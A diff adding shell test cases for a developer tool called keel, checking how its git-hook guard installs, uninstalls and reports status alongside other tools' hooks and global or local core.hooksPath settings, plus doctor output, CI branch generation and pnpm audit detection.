+# git resolves a relative core.hooksPath against the top of the working tree, so status run from a
+# subdirectory must still find keel's old install rather than call it another tool's setting.
+ls="$(legacy_fixture)"; mkdir -p "$ls/sub/deeper"
+out="$( cd "$ls/sub/deeper" && "$KEEL" guard status 2>&1 )"
+case "$out" in
+  *"working-tree path"*) ok "guard status from a subdirectory names an install at .githooks" ;;
+  *) bad "guard legacy" "status from a subdirectory: $out" ;;
+esac
+rm -rf "$ls"
+# The move unsets the local setting only. A global core.hooksPath then takes over, and git would run
+# none of the hooks just written, so install must say so rather than report success.
+lx="$(legacy_fixture)"
+printf '[core]\n\thooksPath = /nonexistent/elsewhere\n' > "$lx/global-config"
+out="$( cd "$lx" && GIT_CONFIG_GLOBAL="$lx/global-config" "$KEEL" guard install 2>&1 )"; rc=$?
+case "$rc:$out" in
+  0:*) bad "guard legacy" "install exited 0 with a global core.hooksPath in effect: $out" ;;
+  *global*) ok "guard install refuses when a global core.hooksPath takes over after the move, and names its scope" ;;
+  *) bad "guard legacy" "install refused without naming the global setting: $out" ;;
+esac
+rm -rf "$lx"
+lu="$(legacy_fixture)"
+( cd "$lu" && "$KEEL" guard uninstall >/dev/null 2>&1 )
+[ -z "$(git -C "$lu" config core.hooksPath)" ] \
+  && ok "guard uninstall unsets core.hooksPath for an install at .githooks" \
+  || bad "guard legacy" "core.hooksPath survived uninstall: '$(git -C "$lu" config core.hooksPath)'"
+rm -rf "$lu"
+# The same project commit-msg beside it: unsetting core.hooksPath would stop that hook running, so
+# uninstall leaves the setting and says which hook it is keeping alive.
+lk="$(legacy_fixture)"
+printf '#!/bin/sh\n# the project own commit-msg\nexit 0\n' > "$lk/.githooks/commit-msg"
+chmod +x "$lk/.githooks/commit-msg"
+out="$( cd "$lk" && "$KEEL" guard uninstall 2>&1 )"
+case "$(git -C "$lk" config core.hooksPath):$out" in
+  .githooks:*"holds commit-msg"*) ok "guard uninstall leaves core.hooksPath on a .githooks that also holds another hook, and names it" ;;
+  *) bad "guard legacy" "core.hooksPath='$(git -C "$lk" config core.hooksPath)' after uninstall: $out" ;;
+esac
+rm -rf "$lk"
+# git runs only executable hook files, and never a *.sample, so neither kind in .githooks is a hook
+# the move would stop: a README.md or an executable commit-msg.sample must not block it.
+ln="$(legacy_fixture)"
+printf 'These are our hooks.\n' > "$ln/.githooks/README.md"
+printf '#!/bin/sh\nexit 0\n' > "$ln/.githooks/commit-msg.sample"; chmod +x "$ln/.githooks/commit-msg.sample"
+( cd "$ln" && "$KEEL" guard install >/dev/null 2>&1 ) && [ -z "$(git -C "$ln" config core.hooksPath)" ] \
+  && ok "guard install moves a .githooks install beside a README.md and an executable .sample" \
+  || bad "guard legacy" "install refused or left core.hooksPath='$(git -C "$ln" config core.hooksPath)' beside a README.md and a .sample"
+rm -rf "$ln"
+# keel's old install reached through a global core.hooksPath only. This repository cannot unset a
+# global setting, so neither install nor uninstall may claim to have, and each names the scope.
+lg2="$(legacy_fixture)"; git -C "$lg2" config --unset core.hooksPath
+printf '[core]\n\thooksPath = .githooks\n' > "$lg2/global-config"
+out="$( cd "$lg2" && GIT_CONFIG_GLOBAL="$lg2/global-config" "$KEEL" guard install 2>&1 )"; rc=$?
+case "$rc:$out" in
+  0:*) bad "guard legacy" "install exited 0 with .githooks set only globally: $out" ;;
+  *"set in the global git config"*) ok "guard install refuses a .githooks install set only globally, and names the scope" ;;
+  *) bad "guard legacy" "install refused without naming the global scope: $out" ;;
+esac
+out="$( cd "$lg2" && GIT_CONFIG_GLOBAL="$lg2/global-config" "$KEEL" guard uninstall 2>&1 )"
+case "$out" in
+  *"unset core.hooksPath, which pointed"*) bad "guard legacy" "uninstall claimed to unset a global core.hooksPath: $out" ;;
+  *"set in the global git config"*) ok "guard uninstall says a global core.hooksPath remains, and names the scope" ;;
+  *) bad "guard legacy" "uninstall did not name the global scope: $out" ;;
+esac
+rm -rf "$lg2"
+
+# ---- another tool's pre-commit beside keel's pre-push -------------------------------------------
+# `pre-commit install` writes .git/hooks/pre-commit over keel's. The push guard still runs, so the
+# status is installed, but the commit guard line must not call the other tool's hook keel's.
+oc="$(fixture node-ts)"
+( cd "$oc" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 \
+  && printf '#!/bin/sh\n# another tool\nexit 0\n' > .git/hooks/pre-commit )
+out="$( cd "$oc" && "$KEEL" guard status 2>&1 )"; rc=$?
+case "$rc:$out" in
+  0:*"push guard: active"*"pre-commit is another tool's hook"*) ok "guard status is active beside another tool's pre-commit, and names it" ;;
+  *) bad "guard foreign" "status rc=$rc: $out" ;;
+esac
+rm -rf "$oc"
+# uninstall removes keel's files only.
+ou="$(fixture node-ts)"
+( cd "$ou" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 \
+  && printf '#!/bin/sh\n# another tool\nexit 0\n' > .git/hooks/pre-commit \
+  && "$KEEL" guard uninstall >/dev/null 2>&1 )
+grep -q 'another tool' "$ou/.git/hooks/pre-commit" 2>/dev/null && [ ! -e "$ou/.git/hooks/pre-push" ] \
+  && ok "guard uninstall removes keel's hooks and leaves another tool's pre-commit" \
+  || bad "guard foreign" "after uninstall: pre-commit $( grep -q 'another tool' "$ou/.git/hooks/pre-commit" 2>/dev/null && echo kept || echo gone ), pre-push $( [ -e "$ou/.git/hooks/pre-push" ] && echo kept || echo gone )"
+rm -rf "$ou"
+
+# ---- a lost executable bit, and a core.hooksPath naming .git/hooks ------------------------------
+# git skips a hook that is not executable, so a keel pre-push without the bit guards nothing.
+xb="$(fixture node-ts)"
+( cd "$xb" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 \
+  && chmod -x .git/hooks/pre-push )
+( cd "$xb" && "$KEEL" guard status >/dev/null 2>&1 ) \
+  && bad "guard" "status exited 0 with a pre-push that is not executable" \
+  || ok "guard status is non-zero when keel's pre-push is not executable"
+( cd "$xb" && "$KEEL" guard install >/dev/null 2>&1 )
+[ -x "$xb/.git/hooks/pre-push" ] && ok "guard install restores the executable bit" \
+  || bad "guard" "pre-push still not executable after install"
+rm -rf "$xb"
+# A core.hooksPath naming git's own hooks directory redirects nothing, so it is not another tool's.
+gh="$(fixture node-ts)"
+( cd "$gh" && "$KEEL" init -y >/dev/null 2>&1 && git config core.hooksPath .git/hooks )
+( cd "$gh" && "$KEEL" guard install >/dev/null 2>&1 ) && ( cd "$gh" && "$KEEL" guard status >/dev/null 2>&1 ) \
+  && ok "core.hooksPath set to .git/hooks is not foreign: install succeeds and status is 0" \
+  || bad "guard" "install or status failed with core.hooksPath=.git/hooks"
+rm -rf "$gh"
+
+# ---- doctor names the guard's real state, and never sends anyone to replace another tool --------
+# doctor tested core.hooksPath=.githooks plus an executable .githooks/pre-push, so any project's own
+# .githooks/pre-push read as keel's guard, and every other state got "Run: keel guard install",
+# which for a husky or lefthook project meant switching those hooks off.
+dg="$(fixture node-ts)"
+( cd "$dg" && "$KEEL" init -y >/dev/null 2>&1 )
+seed_standards "$dg"
+( cd "$dg" && git config core.hooksPath .husky )
+out="$( cd "$dg" && "$KEEL" doctor --fast 2>&1 )"
+line="$(printf '%s\n' "$out" | grep 'push guard')"
+case "$line" in
+  *"which keel did not set"*)
+    case "$line" in
+      *"Run: keel guard install"*) bad "doctor guard state" "a foreign core.hooksPath was told to run guard install: $line" ;;
+      *) ok "doctor names a foreign core.hooksPath and does not send it to guard install" ;;
+    esac ;;
+  *) bad "doctor guard state" "foreign core.hooksPath line: $line" ;;
+esac
+( cd "$dg" && git config --unset core.hooksPath \
+  && printf '#!/bin/sh\n# another tool\nexit 0\n' > .git/hooks/pre-push && chmod +x .git/hooks/pre-push )
+out="$( cd "$dg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"ok    push guard installed"*) bad "doctor guard state" "another tool's pre-push counted as keel's guard" ;;
+  *"another tool's hook"*) ok "doctor does not count another tool's pre-push as the guard" ;;
+  *) bad "doctor guard state" "foreign pre-push line: $(printf '%s\n' "$out" | grep 'push guard')" ;;
+esac
+( cd "$dg" && rm -f .git/hooks/pre-push \
+  && printf '#!/bin/sh\n# another tool\nexit 0\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit )
+out="$( cd "$dg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"pre-commit is another tool's hook"*) ok "doctor names another tool's pre-commit rather than calling the guard absent" ;;
+  *) bad "doctor guard state" "foreign pre-commit line: $(printf '%s\n' "$out" | grep 'push guard')" ;;
+esac
+( cd "$dg" && rm -f .git/hooks/pre-commit && "$KEEL" guard install >/dev/null 2>&1 \
+  && mkdir -p .githooks \
+  && mv .git/hooks/pre-push .git/hooks/pre-commit .git/hooks/prepare-commit-msg .githooks/ \
+  && git config core.hooksPath .githooks )
+out="$( cd "$dg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"WARN  the push guard is installed in .githooks/, a working-tree path"*)
+    ok "doctor warns that an install at .githooks runs a checked-out branch's hooks" ;;
+  *) bad "doctor guard state" "legacy line: $(printf '%s\n' "$out" | grep 'push guard')" ;;
+esac
+# install refuses to move a .githooks install beside hooks keel did not write, so neither doctor nor
+# status may send anyone straight to it: both name those hooks first.
+( cd "$dg" && printf '#!/bin/sh\nexit 0\n' > .githooks/commit-msg && chmod +x .githooks/commit-msg )
+out="$( cd "$dg" && "$KEEL" doctor --fast 2>&1 )"
+line="$(printf '%s\n' "$out" | grep 'push guard')"
+case "$line" in
+  *"Run: keel guard install"*) bad "doctor guard state" "a legacy install beside another hook was sent straight to guard install: $line" ;;
+  *commit-msg*) ok "doctor names the other hooks in .githooks rather than sending anyone straight to guard install" ;;
+  *) bad "doctor guard state" "legacy beside another hook line: $line" ;;
+esac
+out="$( cd "$dg" && "$KEEL" guard status 2>&1 )"
+case "$out" in
+  *"Re-run 'keel guard install' to move it"*) bad "guard legacy" "status sent a legacy install beside another hook straight to install: $out" ;;
+  *commit-msg*) ok "guard status names the other hooks in .githooks rather than sending anyone straight to install" ;;
+  *) bad "guard legacy" "status on a legacy install beside another hook: $out" ;;
+esac
+rm -rf "$dg"
+# A global core.hooksPath is one nothing in this repository can undo, so doctor and status both
+# name the config it came from, which is the file the user has to edit.
+dgg="$(fixture node-ts)"
+( cd "$dgg" && "$KEEL" init -y >/dev/null 2>&1 && mkdir -p elsewhere )
+printf '[core]\n\thooksPath = %s\n' "$dgg/elsewhere" > "$dgg/global-config"
+out="$( cd "$dgg" && GIT_CONFIG_GLOBAL="$dgg/global-config" "$KEEL" doctor --fast 2>&1 )"
+line="$(printf '%s\n' "$out" | grep 'push guard')"
+case "$line" in
+  *"global git config"*) ok "doctor names the global config a foreign core.hooksPath comes from" ;;
+  *) bad "doctor guard state" "global core.hooksPath line: $line" ;;
+esac
+out="$( cd "$dgg" && GIT_CONFIG_GLOBAL="$dgg/global-config" "$KEEL" guard status 2>&1 )"
+case "$out" in
+  *"global git config"*) ok "guard status names the global config a foreign core.hooksPath comes from" ;;
+  *) bad "guard foreign" "status with a global core.hooksPath: $out" ;;
+esac
+rm -rf "$dgg"
+
+# ---- a failing verify.security is reported as an audit result, not a broken command -------------
+# An audit exits non-zero on a finding at or above its threshold, and when it cannot reach its
+# registry. "does not run" sent the reader to debug a command that ran.
+fs="$(fixture node-ts)"
+( cd "$fs" && "$KEEL" init -y >/dev/null 2>&1 \
+  && "$KEEL" profile set verify.security 'exit 3' >/dev/null 2>&1 )
+seed_standards "$fs"
+[ "$(verify_of "$fs" security)" = "exit 3" ] \
+  || bad "verify.security result" "fixture precondition: verify.security is '$(verify_of "$fs" security)'"
+out="$( cd "$fs" && "$KEEL" doctor 2>&1 )"
+case "$out" in
+  *"FAIL  verify.security exited 3"*"run it to see which"*)
+    ok "doctor reports a failing verify.security as an exit code and how to read it" ;;
+  *) bad "verify.security result" "line: $(printf '%s\n' "$out" | grep 'verify.security')" ;;
+esac
+case "$out" in
+  *"verify.security does not run"*) bad "verify.security result" "still says 'does not run'" ;;
+  *) ok "a failing verify.security no longer reads as a command that does not run" ;;
+esac
+rm -rf "$fs"
+
+# ---- write_ci follows the profile's branch, not git's ---------------------------------------------
+# Both default-branch cases above use a master repository where git and the profile agree, so
+# deleting write_ci's read of the profile left them green. Here they disagree.
+tb="$(fixture node-ts)"
+( cd "$tb" && "$KEEL" init -y >/dev/null 2>&1 \
+  && "$KEEL" profile set conventions.default_branch trunk >/dev/null 2>&1 \
+  && rm -rf .github && "$KEEL" init -y >/dev/null 2>&1 )
+[ "$(prof_of "$tb" conventions.default_branch)" = trunk ] \
+  || bad "write_ci branch" "fixture precondition: the profile does not record trunk"
+grep -q 'branches: \[trunk\]' "$tb/.github/workflows/ci.yml" \
+  && ok "generated CI triggers on the profile's branch where git names another" \
+  || bad "write_ci branch" "workflow trigger: $(grep -n 'branches' "$tb/.github/workflows/ci.yml")"
+rm -rf "$tb"
+
+# ---- pnpm detection has a case of its own -------------------------------------------------------
+# The CI case for pnpm reads write_ci's own mapping, so deleting detect_verify's pnpm arm left
+# every case green.
+sp="$(fixture node-ts)"; : > "$sp/pnpm-lock.yaml"
+( cd "$sp" && "$KEEL" init -y >/dev/null 2>&1 )
+[ "$(verify_of "$sp" security)" = "pnpm audit --audit-level high" ] \
+  && ok "init detects verify.security from a pnpm-lock.yaml" \
+  || bad "verify.security" "pnpm: got '$(verify_of "$sp" security)'"
+rm -rf "$sp"
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
